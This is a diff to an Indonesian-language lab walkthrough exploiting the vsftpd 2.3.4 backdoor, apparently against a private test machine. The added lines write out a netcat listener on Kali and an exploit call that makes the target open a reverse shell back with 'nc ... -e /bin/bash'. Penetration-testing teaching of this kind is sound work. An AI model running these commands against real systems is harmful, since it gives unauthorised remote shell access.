@@ -75,7 +75,14 @@ python3 vsftpd_234_exploit.py 10.0.2.4 21 whoami
 ```
 Berhasil!
 
-Selanjutnya kita establish reverse shell (Cek Cheatsheet)
+Selanjutnya kita establish reverse shell , pertama buat listener terlebih dahulu di Kali:
+```
+nc -nlvp 4444
+```
+Execute exploit dengan reverse shell commands
+```
+python3 vsftpd_234_exploit.py 10.0.2.4 21 "nc -nv <IP_Kali> 4444 -e /bin/bash"
+```
 
 Upgrade ke interactive shell (Cek Cheat Sheet)
 
